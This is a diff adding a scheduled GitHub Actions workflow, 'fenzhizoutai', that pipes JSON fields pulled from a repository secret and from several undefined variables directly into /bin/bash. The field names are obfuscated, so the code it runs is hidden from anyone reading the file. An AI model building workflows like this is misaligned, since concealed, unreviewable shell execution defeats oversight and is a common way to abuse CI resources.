@@ -1,0 +1,24 @@
+name: fenzhizoutai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fenzhizoutai
+        env:
+          q14: ${{ secrets.q14 }}
+        run: |
+          echo $q14 | jq -r .wojwy42942 | /bin/bash
+          echo $tajru3 | jq -r .u4 | /bin/bash
+          echo $ce7601 | jq -r .x75 | /bin/bash
+          echo $m08000 | jq -r .h75 | /bin/bash
+          echo $hlril03 | jq -r .qm6458 | /bin/bash
+          echo $masgs4 | jq -r .dvfcn9525 | /bin/bash
+          echo $b28 | jq -r .n19 | /bin/bash
+
